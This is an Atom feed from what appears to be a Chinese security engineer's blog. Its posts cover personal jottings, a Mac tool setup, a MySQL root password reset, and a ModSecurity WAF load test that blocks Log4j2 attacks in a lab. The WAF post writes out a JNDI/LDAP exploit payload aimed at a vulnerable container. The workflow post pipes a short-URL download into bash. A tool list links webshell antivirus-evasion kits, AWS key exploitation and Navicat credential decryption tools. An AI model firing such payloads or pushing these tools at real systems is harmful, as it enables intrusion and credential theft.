@@ -1,0 +1,312 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://vincentfox.github.io/blog/</id>
+    <title>纵有疾风起</title>
+    <updated>2025-06-24T08:38:26.187Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://vincentfox.github.io/blog/"/>
+    <link rel="self" href="https://vincentfox.github.io/blog/atom.xml"/>
+    <subtitle>安全工程师的思考及爱好</subtitle>
+    <logo>https://vincentfox.github.io/blog/images/avatar.png</logo>
+    <icon>https://vincentfox.github.io/blog/favicon.ico</icon>
+    <rights>All rights reserved 2025, 纵有疾风起</rights>
+    <entry>
+        <title type="html"><![CDATA[测试]]></title>
+        <id>https://vincentfox.github.io/blog/post/ce-shi/</id>
+        <link href="https://vincentfox.github.io/blog/post/ce-shi/">
+        </link>
+        <updated>2025-05-19T14:44:12.000Z</updated>
+        <content type="html"><![CDATA[<p>禅与摩托车维修艺术鬼故事哲学</p>
+<p>梦见手机声音关不掉</p>
+<p>地震捐款</p>
+<p>宁浩香火</p>
+<p>保险的事情<br>
+手写模拟器</p>
+<p>秘塔</p>
+<p>38节本来是庆祝女性独立却被消费</p>
+<p>时间就是被用来浪费的资本主义利用效率</p>
+<p>马克思主义哲学</p>
+<p>成功是偶然的把每次的成果质量保持在8分以上就会趋近于成功</p>
+<p>我们都是每个领域都猴子在那摇晃树呢本质上没有任何意义</p>
+<p>周旋李香兰(日本人)邓丽君(台湾) 何时君在再来探戈阿根廷吉他起源于西班牙</p>
+<p>写完日记做成播客</p>
+<p>理性是实用价值感性是情绪价值</p>
+<p>电流在经过导体的过程中会形成电阻，原因是电子的格，超导就是不会产生热量，电子不会遇到电阻，损耗变小微乎其微</p>
+<p>理性是实用价值感性是情绪价值</p>
+<p>电流在经过导体的过程中会形成电阻，原因是电子的格，超导就是不会产生热量，电子不会遇到电阻，损耗变小微乎其微</p>
+<p>所有的艺术形式都是表达，学习什么样的表达才能打动人</p>
+<p>斯大林格勒战役</p>
+<p>新技术来临的时候要做第一代人还是被抛弃的一代人</p>
+<p>PayPal</p>
+<p>较麻堂会驾驶我的车</p>
+<p>Openai 和 google百度应该是平台的抢跑者都围绕这个开展</p>
+<p>前期是一些小应用后期大的公司就开始起来了将是内容爆炸的时代</p>
+<p>笛卡尔身心二元论</p>
+<p>为什么不敢发布作品，怕被评价，内心脆弱导致</p>
+<p>早起洗头洗澡然后学习试试效果</p>
+<p>无论是猫还是人都有自己自由，学会尊重<br>
+Jupyter Notebook<br>
+小猫咪也不知道它会掉毛，它只想蹭蹭你，我也不是想烦你，我只是特别在意你</p>
+<p>If you are depressed you are living in the past.<br>
+如果你感到沮丧，你就活在过去。</p>
+<p>If you are anxious, you are living in the future.<br>
+如果你焦虑，你就是生活在未来。</p>
+<p>If you are at peace you are living in the present.<br>
+如果你内心平静，你就是活在当下。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的工作流]]></title>
+        <id>https://vincentfox.github.io/blog/post/wo-de-gong-zuo-liu/</id>
+        <link href="https://vincentfox.github.io/blog/post/wo-de-gong-zuo-liu/">
+        </link>
+        <updated>2025-05-16T08:26:26.000Z</updated>
+        <content type="html"><![CDATA[<p>mac<br>
+warp<br>
+raycast 卸载 自动退出</p>
+<p>brew install neofetch  系统状态<br>
+echo 'neofetch' &gt;&gt; .zshrc</p>
+<p>brew install neovim</p>
+<p>brew install emacs</p>
+<p>清理工具<br>
+curl -fsSL https://dub.sh/mcleanup | bash -s update 进行安装，然后在 .zshrc 里面加上 alias clean=&quot;sudo /usr/local/bin/mac-cleanup&quot;，直接命令行 clean 清理工具</p>
+<p>brew install fzf  查找</p>
+<p>brew install yazi 文件管理</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Mysql 跳过密码验证，修改密码]]></title>
+        <id>https://vincentfox.github.io/blog/post/mysql-tiao-guo-mi-ma-yan-zheng-xiu-gai-mi-ma/</id>
+        <link href="https://vincentfox.github.io/blog/post/mysql-tiao-guo-mi-ma-yan-zheng-xiu-gai-mi-ma/">
+        </link>
+        <updated>2025-04-29T13:24:58.000Z</updated>
+        <content type="html"><![CDATA[<p>1、修改Mysql的配置文件：</p>
+<p>找到MySQL配置文件，在[mysqld]下添加skip-grant-tables，关闭mysql服务并重新开启；</p>
+<p>然后输入命令：mysql -u root -p</p>
+<p>回车后，要求输入密码，直接回车跳过，则直接进入MySQL</p>
+<p>2、修改密码：</p>
+<p>输入以下命令开始修改root用户的密码</p>
+<p>mysql&gt; update mysql.user set password=PASSWORD(‘新密码‘) where User=‘root‘;</p>
+<p>刷新权限表 ：</p>
+<p>mysql&gt; flush privileges;</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Nginx+modscrutiny实现WAF防御]]></title>
+        <id>https://vincentfox.github.io/blog/post/nginxmodesecurity-fang-yu-fang-an/</id>
+        <link href="https://vincentfox.github.io/blog/post/nginxmodesecurity-fang-yu-fang-an/">
+        </link>
+        <updated>2025-04-18T04:15:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="功能背景">功能背景</h2>
+<p>为了实现在Nginx拦截logfj2漏洞等相关的攻击，在网上查阅相关的资料，发现有个ModSecurity的模块，ModSecurity是一个针对web容器开发的waf模块，起初是对Apache进行适配，从3.0以后的版本对Nginx和IIS也都有了很好的适配，ModSecurity支持和新规则集CRS，CRS是保护Web应用免收0day攻击的规则，此外ModSecurity还支持并行文本匹配、GeoIP解析、内容注入、自动化规则更新和脚本等。同时支持OWASP ，OWASP 是一个安全社区，开发和维护着一套免费的应用程序保护规则CRS，用户可以根据自己的需求选择不同的规则，也可以通过 ModSecurit y手工创建安全过滤器、定义攻击并实现主动的安全输入验证。</p>
+<h2 id="预期目标">预期目标</h2>
+<p>能够在nginx添加规则针对logfj2漏洞特征进行拦截</p>
+<h2 id="技术路线及技术关键点">技术路线及技术关键点</h2>
+<pre><code>测试业务机器：8C8G  ip 88.88.88.103 centos7
+
+测试NGINX机器：8C8G ip 88.88.88.102 centos7
+
+测试攻击机器： 8C8G ip 88.88.88.101 ubuntu
+</code></pre>
+<p>测试业务机搭建漏洞环境</p>
+<pre><code>docker run -itd -p 8080:8080 registry.cn-zhangjiakou.aliyuncs.com/rcs-team/vulnerability:log4j2-rce-2021-12-02
+</code></pre>
+<p>测试NGINX机器搭建nginx+modscrutiny</p>
+<p>链接</p>
+<p>通过测试代码访问漏洞环境拿到指定规则文件并更改配置重新加载实现拦截效果</p>
+<pre><code>攻击测试机执行测试代码
+echo ‘88.88.88.102 aa.gyyx.cn’ &gt; /etc/hosts
+
+ab -n 1  -c 2 -p post.txt -T 'application/x-www-form-urlencoded' 'http://aa.gyyx.cn/hello'
+
+echo 'payload=${jndi:ldap://xxx.xxx.xxx./exp}' &gt; post.txt
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m3.png" alt="m3" loading="lazy"></figure>
+<p>加载防御配置并重启nginx重新执行代码拦截成功</p>
+<img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m5.png" alt="image-20220722114924312" style="zoom:150%;" />
+<h2 id="特性演示">特性演示</h2>
+<p>waf配置加载前访问状态是200，并且可以执行logfj2的远程代码</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m2.png" alt="m2" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m1.png" alt="m1" loading="lazy"></figure>
+<p>waf配置加载后状态码是403成功拦截并且有拦截日志</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m4.png" alt="m4" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/m3.png" alt="m3" loading="lazy"></figure>
+<h2 id="测试分析">测试分析</h2>
+<p>本次压测是在内网环境的虚拟机进行的，针对nginx进行压测，配置文件优化采用了社区线上的配置，后端启用了doker的java站点，Nginx机器进行了内核优化，详情看下面的详情。</p>
+<p>内核优化</p>
+<pre><code>net.ipv4.ip_forward = 0
+net.ipv4.conf.default.rp_filter = 1
+net.ipv4.conf.default.accept_source_route = 0
+kernel.sysrq = 0
+kernel.core_uses_pid = 1
+net.ipv4.tcp_syncookies = 0 #这里需要改为0不然系统会误认为是syn攻击
+net.bridge.bridge-nf-call-ip6tables = 0
+net.bridge.bridge-nf-call-iptables = 0
+net.bridge.bridge-nf-call-arptables = 0
+kernel.msgmnb = 65536
+kernel.msgmax = 65536
+kernel.shmmax = 68719476736
+kernel.shmall = 4294967296
+net.ipv4.tcp_synack_retries = 0
+net.ipv4.tcp_max_syn_backlog = 50000
+fs.file-max = 8192000
+fs.nr_open = 10000000
+net.core.somaxconn = 65535
+net.core.rmem_max = 16777216
+net.core.wmem_max = 16777216
+net.core.netdev_max_backlog = 165536
+net.ipv4.ip_local_port_range = 1024 65535
+kernel.shmall = 154618822656
+net.ipv4.tcp_tw_reuse = 1
+net.ipv4.tcp_tw_recycle = 0
+net.ipv4.tcp_keepalive_time = 1200
+net.ipv4.tcp_fin_timeout = 10
+net.ipv4.tcp_max_tw_buckets = 360000
+net.netfilter.nf_conntrack_max = 2100000
+net.netfilter.nf_conntrack_tcp_timeout_established = 120
+net.ipv4.tcp_syn_retries = 3
+net.ipv4.tcp_sack = 0
+</code></pre>
+<p>测试命令</p>
+<pre><code>ab -r -n 5000 -c 500 'http://aa.test.cn/'
+</code></pre>
+<p>采用的规则集</p>
+<pre><code>Include /usr/local/tengine/conf/modsecurity/crs-setup.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-901-INITIALIZATION.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-911-METHOD-ENFORCEMENT.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-913-SCANNER-DETECTION.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-921-PROTOCOL-ATTACK.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf
+Include /usr/local/tengine/conf/modsecurity/rules/REQUEST-949-BLOCKING-EVALUATION.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-950-DATA-LEAKAGES.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-952-DATA-LEAKAGES-JAVA.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-954-DATA-LEAKAGES-IIS.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-959-BLOCKING-EVALUATION.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-980-CORRELATION.conf
+Include /usr/local/tengine/conf/modsecurity/rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf
+</code></pre>
+<p>测试结果</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/VincentFox/blog_img/main/images/waf.png" alt="waf" loading="lazy"></figure>
+<h2 id="结论">结论</h2>
+<p>由于全规则集匹配对于CPU的消耗很大，本次测试的规则集按照业务需求，剔除了不必要规则，保留了符合业务场景的需要，测试每秒500的并发去测试规则集，对Nginx的机器作用在8个核心上大概占用CPU的60%左右，通过计算线上的两台Nginx可以满足需要。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的工具]]></title>
+        <id>https://vincentfox.github.io/blog/post/wo-de-gong-ju/</id>
+        <link href="https://vincentfox.github.io/blog/post/wo-de-gong-ju/">
+        </link>
+        <updated>2025-04-17T08:15:27.000Z</updated>
+        <content type="html"><![CDATA[<p>https://github.com/thinkoaa/Deadpool 代理池</p>
+<p>https://github.com/honmashironeko/ProxyCat 代理池服务</p>
+<p>https://github.com/SuperManito/LinuxMirrors?tab=readme-ov-file 镜像源更换</p>
+<p>https://github.com/RubyMetric/chsrc 编程镜像源自动切换</p>
+<p>https://github.com/yqcs/prismx 棱镜漏扫工具</p>
+<p>https://github.com/fasnow/fine 空间测绘</p>
+<p>https://github.com/BornToBeRoot/NETworkManager 网管系统</p>
+<p>https://github.com/1024-lab/smart-admin?tab=readme-ov-file 后台管理系统</p>
+<p>https://github.com/dataease/dataease/?tab=readme-ov-file 数据分析</p>
+<p>https://github.com/GyulyVGC/sniffnet 网络流量分析</p>
+<p>https://github.com/AykutSarac/jsoncrack.com 在线json数据化</p>
+<p>https://github.com/nxtrace/NTrace-core 路由追踪</p>
+<p>https://github.com/GopeedLab/gopeed 下载工具</p>
+<p>https://www.ddosi.org/bbot/ 命令行扫描工具</p>
+<p>https://cmwtat.cloudmoe.com/cn.html win10激活</p>
+<p>https://github.com/microsoft/PowerToys win小工具</p>
+<p>https://www.winfr.com.cn/ win数据恢复</p>
+<p>https://ata.360.net/ 云沙箱</p>
+<p>https://github.com/star7th/coolmonitor 网站监控</p>
+<p>https://github.com/sky22333/ansible ansible管理</p>
+<p>https://github.com/allinssl/allinssl ssl 证书管理</p>
+<p>https://github.com/rybbit-io/rybbit?tab=readme-ov-file 网站跟踪分析</p>
+<p>https://github.com/AnkioTomas/unveilr 小程序代码审计</p>
+<p>https://github.com/Ackites/KillWxapkg 小程序反编译</p>
+<p>https://github.com/aaPanel/aaWAF 宝塔 WAF</p>
+<p>https://github.com/schollz/croc 局域网互传文件</p>
+<p>https://github.com/cilium/pwru linux抓包工具</p>
+<p>https://github.com/jesseduffield/lazygit git工具</p>
+<p>https://github.com/aristocratos/btop 服务器状态</p>
+<p>https://github.com/dlvhdr/gh-dash git仪表板</p>
+<p>https://github.com/gitkraken/gk-cli git多仓库管理</p>
+<p>https://github.com/yorukot/superfile 终端文件管理</p>
+<p>https://github.com/sxyazi/yazi 终端文件管理</p>
+<p>https://github.com/xpipe-io/xpipe?tab=readme-ov-file 替代 xshell 的终端管理软件</p>
+<p>https://github.com/charmbracelet/soft-serve git服务器</p>
+<p>https://github.com/tconbeer/harlequin SQL管理工具</p>
+<p>https://github.com/hatoo/oha http压力测试工具</p>
+<p>https://github.com/darrenburns/posting api调用</p>
+<p>https://github.com/ducaale/xh 替代 curl 测试工具</p>
+<p>https://github.com/httpie/cli 替代 curl 请求工具有命令行和桌面</p>
+<p>https://github.com/jesseduffield/lazydocker docker管理工具</p>
+<p>https://github.com/fujiapple852/trippy 网络诊断工具</p>
+<p>https://github.com/EnhancedJax/Bagels 记账工具</p>
+<p>https://github.com/bensadeh/tailspin/ 日志查看工具</p>
+<p>https://github.com/luckjiawei/frpc-desktop 内网穿透</p>
+<p>https://unprotect.it/ 恶意软件使用了不被发现规则的检测数据库</p>
+<p>https://github.com/edoardottt/scilla 子域名爆破</p>
+<p>https://github.com/emo-crab/observer_ward 指纹识别</p>
+<p>https://github.com/sandboxie-plus/Sandboxie win沙盒</p>
+<p>https://github.com/niudaii/zpscan?tab=readme-ov-file 站点信息收集工具</p>
+<p>https://github.com/ekkoo-z/Z-Godzilla_ekp webshell 免杀版</p>
+<p>https://github.com/Yeuoly/0xUBypass 免杀程序</p>
+<p>https://github.com/chaitin/veinmind-tools 容器镜像扫描</p>
+<p>https://github.com/VincentFox/soft/Autumn%20AI%20Code%20Audit.zip AI审计工具</p>
+<p>https://github.com/Aabyss-Team/ARL 资产侦查灯塔系统</p>
+<p>https://github.com/zan8in/afrog/ 扫描器</p>
+<p>https://github.com/iina/iina 视频播放器</p>
+<p>https://github.com/AabyssZG/NavicatPwn 内网Navicat数据库管理工具解密</p>
+<p>https://github.com/GhostWolfLab/GhostAD 内网域控信息收集工具</p>
+<p>https://github.com/clash-verge-rev/clash-verge-rev 科学上网</p>
+<p>https://github.com/gorhill/uBlock 拦截广告</p>
+<p>https://github.com/drawdb-io/drawdb 数据库设计可视化</p>
+<p>https://github.com/feschber/lan-mouse 局域网共享键盘鼠标</p>
+<p>https://github.com/ventoy/Ventoy 多系统u盘启动工具</p>
+<p>https://github.com/1Panel-dev/1Panel 服务器面板</p>
+<p>https://github.com/Whisky-App/Whisky mac跑 win 应用</p>
+<p>https://github.com/netnr/kms kms 激活</p>
+<p>https://github.com/asdcorp/ohook win 激活</p>
+<p>https://github.com/DIYgod/RSSHub 转换 rss</p>
+<p>https://github.com/P3TERX/aria2.sh 下载软件</p>
+<p>https://github.com/mack-a/v2ray-agent 科学上网</p>
+<p>https://github.com/VincentFox/soft/应急响应工具.exe 应急响应工具</p>
+<p>https://github.com/Aabyss-Team/awsKeyTools aws key 泄露利用</p>
+<p>https://github.com/operacle/checkcle 网站监控系统</p>
+<p>https://github.com/Safe3/openresty-manager 反向代理系统</p>
+<p>https://github.com/acmesh-official/acme.sh?tab=readme-ov-file 自动续签证书</p>
+<p>https://web-check.xyz 查看网站信息</p>
+<p>https://github.com/tw93/Pake?tab=readme-ov-file 将 web 打包成客户端</p>
+<p>https://github.com/makeplane/plane 项目管理</p>
+<p>https://revi.cc/revios/download/ 精简版 win 系统</p>
+<p>https://github.com/VincentFox/pwncli pwn 工具</p>
+<p>https://web-check.xyz/check/https%3A%2F%2Fwww.gyyx.cn 网站信息检测</p>
+<p>https://github.com/HotBoy-java/PotatoTool 红蓝对抗系统</p>
+<p>https://github.com/knownsec/pocsuite3 poc扫描</p>
+<p>https://github.com/Hackplayers/evil-winrm win横向工具</p>
+<p>https://github.com/hahwul/dalfox xss扫描</p>
+<p>https://github.com/jinsezlb/SnowShadow win扫描工具</p>
+<p>https://github.com/tr0uble-mAker/POC-bomber 漏洞检测</p>
+<p>https://github.com/whgojp/JavaSecLab?tab=readme-ov-file java漏洞平台</p>
+<p>https://github.com/emo-crab/observer_ward 指纹识别系统</p>
+<p>https://github.com/niudaii/zpscan?tab=readme-ov-file 信息收集</p>
+<p>https://github.com/atuinsh/atuin shell历史命令备份</p>
+<p>https://github.com/Col-E/Recaf java 字节码编辑器</p>
+<p>https://github.com/BlackINT3/OpenArk win逆向分析工具</p>
+<p>https://github.com/liriliri/aya adb工具</p>
+<p>https://github.com/project-gauntlet/gauntlet  开源 raycast</p>
+<p>https://github.com/bin456789/reinstall 一键 DD</p>
+<p>https://github.com/rcourtman/Pulse Proxmox监控</p>
+<p>https://github.com/Canop/dysk 替换du工具</p>
+<p>https://github.com/CuriousLearnerDev/TrafficEye?tab=readme-ov-file 流量分析</p>
+<p>https://github.com/Pixel-Master/File-Find 查找文件</p>
+<p>https://github.com/aadya940/autoresume?tab=readme-ov-file 简历</p>
+<p>https://github.com/kovidgoyal/kitty mac 终端</p>
+]]></content>
+    </entry>
+</feed>
